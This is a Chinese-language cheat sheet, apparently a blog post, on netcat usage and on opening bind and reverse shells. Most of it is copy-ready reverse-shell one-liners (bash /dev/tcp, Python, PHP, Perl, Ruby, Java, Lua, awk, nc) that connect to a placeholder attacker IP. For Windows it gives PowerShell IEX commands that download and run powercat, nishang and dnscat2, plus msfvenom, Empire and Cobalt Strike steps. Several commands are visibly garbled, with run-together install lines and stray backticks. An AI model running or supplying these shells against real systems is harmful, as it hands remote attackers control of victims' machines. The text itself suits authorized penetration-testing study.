# 关于弹shell


## 1.nc参数

```
(1) -l
用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。

(2) -p <port>
指定端口，暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）

(3) -s 
指定发送数据的源IP地址，适用于多网卡机 

(4) -u
指定nc使用UDP协议，默认为TCP

(5) -v
输出交互或出错信息，新手调试时尤为有用

(6)-w
超时秒数，后面跟数字 

(7)-z
表示zero，表示扫描时不发送任何数据

(8)-n 
直接使用IP地址，而不通过域名服务器；

(9)-e
执行某个程序
```

目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：

```
wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gztar -xvzf netcat-0.7.1.tar.gz./configuremake && make installmake clean
```

## 2.nc建立连接

### 消息共享

服务端启动监听

```
nc -lnvp 4444
```

 客户端进行连接

```
nc -nv IP 4444
```

![image-20231013223623093](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013223623093.png)

 客户端与服务端实现消息共享，即客户端的输入服务端可见，服务端的输入客户端可见。

### 文件传输

和局域网聊天是原理一样的，不过把输入输出重定向到文件

服务端设置监听

```
exe -lnvp 4444 >recv.txt
```

 客户端发送：

```
nc IP 4444 <1.txt
```

![image-20231013224518257](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013224518257.png)

 注：服务端和客户端都可做为接收端和发送端，发送端必须要有文件，接收端可以不创建文件，当接受端不创建文件时，会自动创建并将发送端地内容保存到文件，如果已存在文件将会覆盖其中内容

## 3.正向弹shell

在服务端（靶标机）启动监听

```
nc -lvvp 4444 -e /bin/bash
```

在客户端（攻击机）连接

```
nc IP 4444
```

这种连接又称正向连接，攻击机主动连接靶标机。

![image-20231013230045856](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230045856.png)

 连接成功后便可执行命令。

## 4.反向弹shell

### bash版本

本地作为服务端开启监听（攻击机）

```
nc -lvnp 4444
或nc -vvlp 4444
```

目标机开启反弹

```
bash -i >& /dev/tcp/IP/4444 0>&1

bash -i            创建一个交互式的bash shell
&>                 将标准输出和标准错误都重定向到我们指定的文件
/dev/tcp/IP/4444   建立连接到IP的4444端口
0>&1               将文件描述符0重定向为文件描述符1，也就是标准输入被重定向为标准输出
```

![image-20231013230758727](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013230758727.png)

### python 反弹

本地作为服务器开启监听

```
nc -lvvp 444
```

靶机作为客户端开启反弹

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

![image-20231013231843828](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013231843828.png)

连的时候会稍微有点慢

### nc反弹

本地作为服务器开启监听

```
nc -lvvp 4444
```

靶标机作为客户端反弹shell

```
nc -e /bin/bash IP 4444
```

![image-20231013232442140](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20231013232442140.png)

### awk反弹

```text
awk 'BEGIN{s="/inet/tcp/0/VPS_IP/1234";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```

### php反弹

本地作为服务器开启监听

```
nc -lvnp 4444
```

靶标机作为客户端反弹shell

```
php- 'exec("/bin/bash -i >& /dev/tcp/ip/4444")'
或
php -r '$sock=fsockopen("IP",4444);exec("/bin/bash -i 0>&3 1>&3 2>&3");'
```

### perl反弹

本地作为服务器开启监听

```
nc -lvvp 4444
```

 靶标机作为客户端反弹shell

```
perl -e 'use Socket;$i="IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### ruby反弹

本地作为服务器开启监听端口

```
nc -lvvp 4444
```

靶标作为客户端反弹shell

```
ruby -rsocket -e'f=TCPSocket.open("IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java反弹

本地作为服务器开启监听端口

```
nc -lvvp 4444
```

靶标作为客户端反弹shell

```
r = Runtime.getRuntime()
p = r.``exec``([``"/bin/bash"``,``"-c"``,``"exec 5<>/dev/tcp/IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"``] as String[])
p.waitFor()
```

### lua版本

本地作为服务器开启监听端口

```
nc -lvvp 4444
```

靶标作为客户端反弹shell

lua -e "require('socket');require('os');t=socket.tcp();t:connect('IP','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"

### nc不使用-e参数反弹

本地作为服务器开启监听端口

```
nc -lvvp 4444
```

靶标作为客户端反弹shell

```
mknod` `/tmp/backpipe` `p
/bin/sh` `0<``/tmp/backpipe` `| nc IP 4444 1>``/tmp/backpipe
/bin/bash` `-i > ``/dev/tcp/IP````/4444 ``0<&1 2>&1
```

\```mknod` `backpipe p && telnet IP 4444 0backpipe`

##  5.Windows下反弹shell

### **nc反弹shell**

```text
netcat 下载：https://eternallybored.org/misc/netcat/
服务端反弹：nc VPS_IP 1234 -e c:\windows\system32\cmd.exe
```

### **powershell反弹**

powercat是netcat的powershell版本，功能免杀性都要比netcat好用的多。

```text
PS C:\WWW>powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c VPS_IP -p 1234 -e cmd
```

下载到目标机器本地执行：

```text
PS C:\WWW> Import-Module ./powercat.ps1
PS C:\WWW> powercat -c VPS_IP -p 1234 -e cmd
```

### **MSF反弹shell**

使用msfvenom生成相关Payload

```text
msfvenom -l payloads | grep 'cmd/windows/reverse'
msfvenom -p cmd/windows/reverse_powershell LHOST=VPS_IP LPORT=1234
```

### **Cobalt strike反弹shell**

1、配置监听器：点击Cobalt Strike——>Listeners——>在下方Tab菜单Listeners，点击add。 2、生成payload：点击Attacks——>Packages——>Windows Executable，保存文件位置。 3、目标机执行powershell payload

### **Empire反弹shell**

```text
usestager windows/launcher_vbs
info
set Listener test
execute
```

### **nishang反弹shell**

反弹TCPshell

```text
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress VPS_IP -port 1234
```

反弹UDPshell

```text
powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellUdp.ps1');
Invoke-PowerShellUdp -Reverse -IPAddress VPS_IP -port 1234
```

### **Dnscat反弹shell**

项目地址：

[https://github.com/iagox86/dnscat2github.com/iagox86/dnscat2](https://link.zhihu.com/?target=https%3A//github.com/iagox86/dnscat2)

服务端：

```text
ruby dnscat2.rb --dns "domain=lltest.com,host=xx.xx.xx.xx" --no-cache -e open -e open 
```

目标主机：

```text
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1');Start-Dnscat2 -Domain lltest.com -DNSServer xx.xx.xx.xx
```
